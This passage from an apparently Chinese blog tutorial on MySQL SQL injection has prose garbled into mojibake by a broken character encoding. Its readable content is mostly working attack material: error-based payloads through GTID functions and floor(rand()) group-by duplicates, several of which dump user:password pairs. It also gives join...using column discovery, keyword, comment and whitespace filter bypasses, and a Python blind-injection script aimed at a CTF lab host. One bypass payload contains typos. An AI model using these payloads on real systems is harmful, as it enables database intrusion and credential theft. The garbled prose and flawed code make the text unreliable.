<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5</span><br></pre></td></tr></table></figure>

<p><strong>0X02 å‡½æ•°è¯¦è§£</strong></p>
<p>GTID_SUBSET() å’Œ GTID_SUBTRACT() å‡½æ•°ï¼Œæˆ‘ä»¬çŸ¥é“ä»–çš„è¾“å…¥å€¼æ˜¯ GTIDset ï¼Œå½“è¾“å…¥æœ‰è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™</p>
<ol>
<li>GTID_SUBSET( set1 , set2 ) - è‹¥åœ¨ set1 ä¸­çš„ GTIDï¼Œä¹Ÿåœ¨ set2 ä¸­ï¼Œè¿”å› trueï¼Œå¦åˆ™è¿”å› false ( set1 æ˜¯ set2 çš„å­é›†)</li>
<li>GTID_SUBTRACT( set1 , set2 ) - è¿”å›åœ¨ set1 ä¸­ï¼Œä¸åœ¨ set2 ä¸­çš„ GTID é›†åˆ ( set1 ä¸ set2 çš„å·®é›†)<br>æ­£å¸¸æƒ…å†µå¦‚ä¸‹</li>
</ol>
<blockquote>
<p>GTID_SUBSET(â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:23â€™,â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57â€™)GTID_SUBTRACT(â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:21-57â€™,â€˜3E11FA47-71CA-11E1-9E33-C80AA9429562:20-25â€™)</p>
</blockquote>
<p><strong>0x03 æ³¨å…¥è¿‡ç¨‹( payload )</strong></p>
<p><strong>GTID_SUBSETå‡½æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><strong>GTID_SUBTRACT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯ä¸€äº›å¸¸è§æˆ–è€…ä¸å¸¸è§çš„èƒ½å¤ŸæŠ¥é”™æ³¨å…¥çš„å‡½æ•°ï¼ŒæŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨è¿™äº›å‡½æ•°ï¼Œåœ¨æˆ‘ä»¬çš„æŸ¥è¯¢è¯­å¥ä¸­çš„è¿™äº›å‡½æ•°å†…çš„æŸä¸ªä½ç½®å†åµŒå¥—ä¸€ä¸ªå­æŸ¥è¯¢ï¼Œåˆ©ç”¨äº§ç”Ÿçš„æŠ¥é”™å°†å­æŸ¥è¯¢çš„ç»“æœå›æ˜¾å‡ºæ¥ï¼Œæ¯ä¸ªæŠ¥é”™æ³¨å…¥çš„å‡½æ•°éƒ½æ­é…äº†ç½‘ä¸Šæ‰¾åˆ°çš„ç®€å•çš„payloadï¼Œæƒ…å†µæ€»æ˜¯åœ¨å˜åŒ–ï¼Œæ³¨æ„ä¸€ä¸‹å‡½æ•°ä¸­å­æŸ¥è¯¢æ‰€åœ¨çš„ä½ç½®å³å¯ã€‚</p>
<h6 id="ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™"><a href="#ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™" class="headerlink" title="ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™"></a>ä½¿ç”¨ä¸å­˜åœ¨çš„å‡½æ•°æ¥æŠ¥é”™</h6><p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211126104156-twt8ddd.png" alt="img"></a></p>
<p>éšä¾¿ä½¿ç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œå¯èƒ½ä¼šå¾—åˆ°å½“å‰æ‰€åœ¨çš„æ•°æ®åº“åç§°ã€‚</p>
<h6 id="ä½¿ç”¨-join-using-æŠ¥é”™è·å–åˆ—å"><a href="#ä½¿ç”¨-join-using-æŠ¥é”™è·å–åˆ—å" class="headerlink" title="ä½¿ç”¨ join using() æŠ¥é”™è·å–åˆ—å"></a>ä½¿ç”¨ join using() æŠ¥é”™è·å–åˆ—å</h6><ul>
<li>ä¸€èˆ¬åº”ç”¨äº<strong>æ— åˆ—åæ³¨å…¥</strong>ï¼Œä¸‹æ–‡ç»•è¿‡ä¸­ä¼šç»†è®²ã€‚</li>
</ul>
<blockquote>
<p>é€šè¿‡å…³é”®å­—joinå¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ã€‚é€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åæ‰€åœ¨çš„è¡¨ä¸å…¶è‡ªèº«å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› ï¼ˆç›¸åŒåˆ—åå­˜åœ¨ï¼‰ï¼Œè€Œå‘ç”Ÿé”™è¯¯ã€‚å¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p>
</blockquote>
<p>ä¸‹é¢æ¼”ç¤ºå¦‚ä½•é€šè¿‡joinâ€¦usingæ¥è·å–åˆ—åï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è·å–ç¬¬ä¸€åˆ—çš„åˆ—å:</span><br><span class="line">1&#x27; union select * from (select * from users as a join users as b)as c#</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨using()ä¾æ¬¡è·å–åç»­çš„åˆ—å</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username))c#</span><br><span class="line">1&#x27; union all select * from (select * from users as a join users b using(id,username,password))c#</span><br><span class="line"># æ•°æ®åº“ä¸­asä¸»è¦ä½œç”¨æ˜¯èµ·åˆ«å, å¸¸è§„æ¥è¯´aséƒ½å¯ä»¥çœç•¥ï¼Œä½†æ˜¯ä¸ºäº†å¢åŠ å¯è¯»æ€§, ä¸å»ºè®®çœç•¥</span><br></pre></td></tr></table></figure>

<h5 id="æ³¨å…¥æµç¨‹-1"><a href="#æ³¨å…¥æµç¨‹-1" class="headerlink" title="æ³¨å…¥æµç¨‹"></a>æ³¨å…¥æµç¨‹</h5><p>å¤§ä½“çš„æ³¨å…¥æµç¨‹å°±æ˜¯åœ¨è”åˆæŸ¥è¯¢ä¸æˆåŠŸçš„æƒ…å†µä¸‹å°è¯•ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„å‡½æ•°å¾—åˆ°å›æ˜¾å­æŸ¥è¯¢ç»“æœçš„æŠ¥é”™ç»“æœã€‚</p>
<h4 id="åŒæŠ¥é”™æ³¨å…¥è¯¦è§£ï¼š"><a href="#åŒæŠ¥é”™æ³¨å…¥è¯¦è§£ï¼š" class="headerlink" title="åŒæŠ¥é”™æ³¨å…¥è¯¦è§£ï¼š"></a>åŒæŠ¥é”™æ³¨å…¥è¯¦è§£ï¼š</h4><p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬ç†è§£ä¸€ä¸‹å­æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„å…³é”®å­—æ˜¯selectï¼Œè¿™ä¸ªå¤§å®¶éƒ½çŸ¥é“ã€‚å­æŸ¥è¯¢å¯ä»¥ç®€å•çš„ç†è§£åœ¨ä¸€ä¸ªselectè¯­å¥é‡Œè¿˜æœ‰ä¸€ä¸ªselectã€‚é‡Œé¢çš„è¿™ä¸ªselectè¯­å¥å°±æ˜¯å­æŸ¥è¯¢ã€‚</p>
<p>çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Select <span class="title">concat</span><span class="params">((select database()))</span></span>;</span><br></pre></td></tr></table></figure>

<p>çœŸæ­£æ‰§è¡Œçš„æ—¶å€™ï¼Œå…ˆä»å­æŸ¥è¯¢è¿›è¡Œã€‚å› æ­¤æ‰§è¡Œselect database() è¿™ä¸ªè¯­å¥å°±ä¼šæŠŠå½“å‰çš„<a target="_blank" rel="noopener" href="http://www.2cto.com/database/">æ•°æ®åº“</a>æŸ¥å‡ºæ¥ï¼Œç„¶åæŠŠç»“æœä¼ å…¥åˆ°<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=concat&spm=1001.2101.3001.7020">concat</a>å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥è¿æ¥çš„ã€‚æ¯”å¦‚ concat(â€˜aâ€™,â€™bâ€™)é‚£ç»“æœå°±æ˜¯abäº†ã€‚</p>
<p>åŸç†ï¼š</p>
<p>åŒæ³¨å…¥æŸ¥è¯¢éœ€è¦ç†è§£å››ä¸ªå‡½æ•°&#x2F;è¯­å¥</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="built_in">Rand</span>() <span class="comment">//éšæœºå‡½æ•°</span></span><br><span class="line"><span class="number">2.</span> <span class="built_in">Floor</span>() <span class="comment">//å–æ•´å‡½æ•°</span></span><br><span class="line"><span class="number">3.</span> <span class="built_in">Count</span>() <span class="comment">//æ±‡æ€»å‡½æ•°</span></span><br><span class="line"><span class="number">4.</span> Group by clause <span class="comment">//åˆ†ç»„è¯­å¥</span></span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„ä¸€å¥è¯åŸç†å°±æ˜¯æœ‰ç ”ç©¶äººå‘˜å‘ç°ï¼Œå½“åœ¨ä¸€ä¸ªèšåˆå‡½æ•°ï¼Œæ¯”å¦‚countå‡½æ•°åé¢å¦‚æœä½¿ç”¨åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚[æœ¬åšä¸»æ³¨:è¿™ä¸ªæ˜¯Mysqlçš„bugï¼Œè¯¦è§<a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466333">é“¾æ¥</a>]</p>
<p>ä»¥æœ¬åœ°ä¸€ä¸ªåä¸ºSecurityçš„æ•°æ®åº“ä¸ºä¾‹</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SELECT <span class="title">CONCAT</span><span class="params">((SELECT database()), FLOOR(RAND()*<span class="number">2</span>))</span></span>;</span><br></pre></td></tr></table></figure>

<p>ä¸è¦æ€•ã€‚å…ˆçœ‹æœ€é‡Œé¢çš„SELECT database() è¿™ä¸ªå°±è¿”å›æ•°æ®åº“åï¼Œè¿™é‡Œå°±æ˜¯securityäº†ã€‚ç„¶åFLOOR(RAND()*2)è¿™ä¸ªä¸Šé¢è¯´è¿‡äº†ã€‚ä¸æ˜¯0ï¼Œå°±æ˜¯1.ç„¶åæŠŠè¿™ä¸¤ä¸ªçš„ç»“æœè¿›è¡Œconcatè¿æ¥ï¼Œé‚£ä¹ˆç»“æœä¸æ˜¯security0å°±æ˜¯security1äº†ã€‚</p>
<p><img src="https://img-blog.csdn.net/20180527000303157" alt="img"></p>
<p>å¦‚æœæˆ‘ä»¬æŠŠè¿™æ¡è¯­å¥åé¢åŠ ä¸Šfrom ä¸€ä¸ªè¡¨åã€‚é‚£ä¹ˆä¸€èˆ¬ä¼šè¿”å›security0æˆ–security1çš„ä¸€ä¸ªé›†åˆã€‚æ•°ç›®æ˜¯ç”±è¡¨æœ¬èº«æœ‰å‡ æ¡ç»“æœå†³å®šçš„ã€‚æ¯”å¦‚ä¸€ä¸ªç®¡ç†è¡¨é‡Œæœ‰5ä¸ªç®¡ç†å‘˜ã€‚è¿™ä¸ªå°±ä¼šè¿”å›äº”æ¡è®°å½•ï¼Œè¿™é‡Œusersè¡¨é‡Œæœ‰13ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥è¿”å›äº†13æ¡</p>
<p><img src="https://img-blog.csdn.net/20180527000350116" alt="img"></p>
<p>å¦‚æœæ˜¯ä»information_schema.schemataé‡Œï¼Œè¿™ä¸ªè¡¨é‡ŒåŒ…å«äº†mysqlçš„æ‰€æœ‰æ•°æ®åº“åã€‚è¿™é‡Œæœ¬æœºæœ‰ä¸‰ä¸ªæ•°æ®åº“ã€‚æ‰€ä»¥ä¼šè¿”å›ä¸‰ä¸ªç»“æœ</p>
<p><img src="https://img-blog.csdn.net/2018052700044918" alt="img"></p>
<p>ç°åœ¨æˆ‘ä»¬å‡†å¤‡åŠ ä¸ŠGroup By è¯­å¥äº†ã€‚<br>æˆ‘ä»¬ä½¿ç”¨information_schema.tables æˆ– information_schema.columnsè€…ä¸¤ä¸ªè¡¨æ¥æŸ¥è¯¢ã€‚å› ä¸ºè¡¨é‡Œé¢ä¸€èˆ¬æ•°æ®å¾ˆå¤šã€‚å®¹æ˜“ç”Ÿæˆå¾ˆå¤šçš„éšæœºå€¼ï¼Œä¸è‡³äºå…¨éƒ¨æ˜¯security0ï¼Œè¿™æ ·å°±ä¸èƒ½æŸ¥è¯¢å‡ºç»“æœäº†ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">concat</span><span class="params">((select database()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘å…ˆè§£é‡Šä¸€ä¸‹ã€‚</p>
<p>æˆ‘ä»¬æŠŠconcat((select database()), floor(rand()*2)) è¿™ä¸ªç»“æœå–äº†ä¸€ä¸ªåˆ«å a ï¼Œç„¶åä½¿ç”¨ä»–è¿›è¡Œåˆ†ç»„ã€‚è¿™æ ·ç›¸åŒçš„security0åˆ†åˆ°ä¸€ç»„ï¼Œsecurity1åˆ†åˆ°ä¸€ç»„ã€‚å°±å‰©ä¸‹ä¸¤ä¸ªç»“æœäº†ã€‚</p>
<p><img src="https://img-blog.csdn.net/2018052700054078" alt="img"></p>
<p>æ³¨æ„è¿™é‡Œçš„database()å¯ä»¥æ›¿æ¢æˆä»»ä½•ä½ æƒ³æŸ¥çš„å‡½æ•°ï¼Œæ¯”å¦‚version(), user(), datadir()æˆ–è€…å…¶ä»–çš„æŸ¥è¯¢ã€‚æ¯”å¦‚æŸ¥è¡¨å•Šã€‚æŸ¥åˆ—å•Šã€‚åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<p>æœ€åçš„äº®ç‚¹æ¥äº†ã€‚ã€‚</p>
<p>æˆ‘ä»¬è¾“å…¥è¿™æ¡ï¼šæ³¨æ„å¤šäº†ä¸€ä¸ªèšåˆå‡½æ•°count(*)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">((select database()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdn.net/20180527000625891" alt="img"></p>
<p>æŠ¥é”™äº†</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;security1&#x27;</span> <span class="keyword">for</span> key â€˜group_keyâ€™</span><br></pre></td></tr></table></figure>

<p>åŸå› æ˜¯é‡å¤çš„é”®å€¼ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°securityå°±æ˜¯æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æœäº†</p>
<p>æƒ³è¦æŸ¥è¯¢ç‰ˆæœ¬å°±è¿™æ ·ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">((select version()), floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹æ›¿æ¢äº†database()ä¸ºversion()</p>
<p><img src="https://img-blog.csdn.net/20180527000746699" alt="img"></p>
<p>å†çœ‹ä¸€ä¸ª</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">count</span><span class="params">(*)</span>, <span class="title">concat</span><span class="params">(<span class="string">&#x27;~&#x27;</span>,(select user()),<span class="string">&#x27;~&#x27;</span>, floor(rand()*<span class="number">2</span>))</span>as a from information_schema.tables group by a</span>;</span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">1062</span> (<span class="number">23000</span>): Duplicate entry <span class="string">&#x27;~root@localhost~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„~è¿™ä¸ªç¬¦å·åªæ˜¯ä¸ºäº†è®©ç»“æœæ›´æ¸…æ™°ã€‚</p>
<h2 id="â€œå¸¸è§â€ç»•è¿‡ï¼š"><a href="#â€œå¸¸è§â€ç»•è¿‡ï¼š" class="headerlink" title="â€œå¸¸è§â€ç»•è¿‡ï¼š"></a>â€œå¸¸è§â€ç»•è¿‡ï¼š</h2><h4 id="ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡"><a href="#ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡" class="headerlink" title="ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡"></a>ç»“å°¾æ³¨é‡Šç¬¦ç»•è¿‡</h4><p>Mysqlä¸­å¸¸è§çš„æ³¨é‡Šç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ã€#    %23    --+æˆ–-- -    ;%00</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ‰€æœ‰çš„æ³¨é‡Šç¬¦å…¨éƒ¨è¢«è¿‡æ»¤äº†ï¼ŒæŠŠæˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ç›´æ¥ä½¿ç”¨å¼•å·è¿›è¡Œé—­åˆï¼Œè¿™ç§æ–¹æ³•å¾ˆå¥½ç”¨ã€‚</p>
<h4 id="å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡"><a href="#å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡"></a>å­—ç¬¦ä¸²å˜æ¢ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># å¤§å°å†™ç»•è¿‡</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># åŒå†™ç»•è¿‡</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"># å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤-andã€or-ç»•è¿‡"><a href="#è¿‡æ»¤-andã€or-ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ andã€or ç»•è¿‡"></a>è¿‡æ»¤ andã€or ç»•è¿‡</h4><h5 id="ç®¡é“ç¬¦"><a href="#ç®¡é“ç¬¦" class="headerlink" title="ç®¡é“ç¬¦"></a>ç®¡é“ç¬¦</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨-è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡"><a href="#ä½¿ç”¨-è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡" class="headerlink" title="ä½¿ç”¨^è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡"></a>ä½¿ç”¨^è¿›è¡Œå¼‚æˆ–ç›²æ³¨ç»•è¿‡</h5><blockquote>
<p>å¼‚æˆ–è¿ç®—è§„åˆ™:<br><code>1^1=0 0^0=0 0^1=1</code><br><code>1^1^1=0 1^1^0=0</code><br>æ„é€ payload:<code>&#39;^ascii(mid(database(),1,1)=98)^0</code></p>
</blockquote>
<p>æ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª^0æˆ–1æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœè¿”å›çš„ç»“æœæ˜¯ä¸åŒçš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„.</p>
<h4 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h4><p>ä»¥ä¸‹å­—ç¬¦å¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ä½¿ç”¨æ³¨é‡Šç¬¦/**/ä»£æ›¿ç©ºæ ¼:</span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨åŠ å·+ä»£æ›¿ç©ºæ ¼:(åªé€‚ç”¨äºGETæ–¹æ³•ä¸­)</span><br><span class="line">select+database();</span><br><span class="line"># æ³¨æ„: åŠ å·+åœ¨URLä¸­ä½¿â½¤è®°å¾—ç¼–ç ä¸º%2B: select%2Bdatabase(); (pythonä¸­ä¸ç”¨)</span><br><span class="line"></span><br><span class="line"># ä½¿â½¤æ‹¬å·åµŒå¥—:</span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"># ä½¿â½¤å…¶ä»–ä¸å¯â»…å­—ç¬¦ä»£æ›¿ç©ºæ ¼:</span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line">#åˆ©ç”¨``åˆ†éš”è¿›è¡Œç»•è¿‡</span><br><span class="line">select host,user from user where user=&#x27;a&#x27;union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ä»»ç„¶å¯ä»¥åˆ©ç”¨å¼‚æˆ–ç¬¦å·è¿›è¡Œç›²æ³¨ï¼Œæˆ‘iä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„payloadä¸­å®Œå…¨å¯ä»¥ä¸å­˜åœ¨ç©ºæ ¼ã€‚</p>
<h4 id="è¿‡æ»¤æ‹¬å·ç»•è¿‡"><a href="#è¿‡æ»¤æ‹¬å·ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ‹¬å·ç»•è¿‡"></a>è¿‡æ»¤æ‹¬å·ç»•è¿‡</h4><h5 id="åˆ©ç”¨-order-by-è¿›è¡Œå¸ƒå°”ç›²æ³¨"><a href="#åˆ©ç”¨-order-by-è¿›è¡Œå¸ƒå°”ç›²æ³¨" class="headerlink" title="åˆ©ç”¨ order by è¿›è¡Œå¸ƒå°”ç›²æ³¨"></a>åˆ©ç”¨ order by è¿›è¡Œå¸ƒå°”ç›²æ³¨</h5><p>ä¸Šé¢æœ‰</p>
<h4 id="è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ-ã€ï¼‰ç»•è¿‡"><a href="#è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ-ã€ï¼‰ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ&#x3D;ã€&lt;ã€&gt;ï¼‰ç»•è¿‡"></a>è¿‡æ»¤æ¯”è¾ƒç¬¦å·ï¼ˆ&#x3D;ã€&lt;ã€&gt;ï¼‰ç»•è¿‡</h4><p>æ¯”è¾ƒç¬¦å·ä¸€èˆ¬ä¹Ÿåªå‡ºç°åœ¨ç›²æ³¨ä¸­ï¼Œæ‰€ä»¥éƒ½å°½å¯èƒ½æ­é…äº†è„šæœ¬ã€‚</p>
<h5 id="ä½¿ç”¨-in-ç»•è¿‡"><a href="#ä½¿ç”¨-in-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨ in() ç»•è¿‡"></a>ä½¿ç”¨ in() ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // é”™è¯¯</span><br><span class="line">/?id=&#x27; or ascii(substr((select database()),1,1)) in(115)--+    // æ­£å¸¸å›æ˜¾</span><br><span class="line"></span><br><span class="line">/?id=&#x27; or substr((select database()),1,1) in(&#x27;s&#x27;)--+    // æ­£å¸¸å›æ˜¾</span><br></pre></td></tr></table></figure>

<p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for j in range(37,128):</span><br><span class="line">            url = &quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;.format(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            if &quot;You are in&quot; in r.text:</span><br><span class="line">                flag += chr(j)</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure>

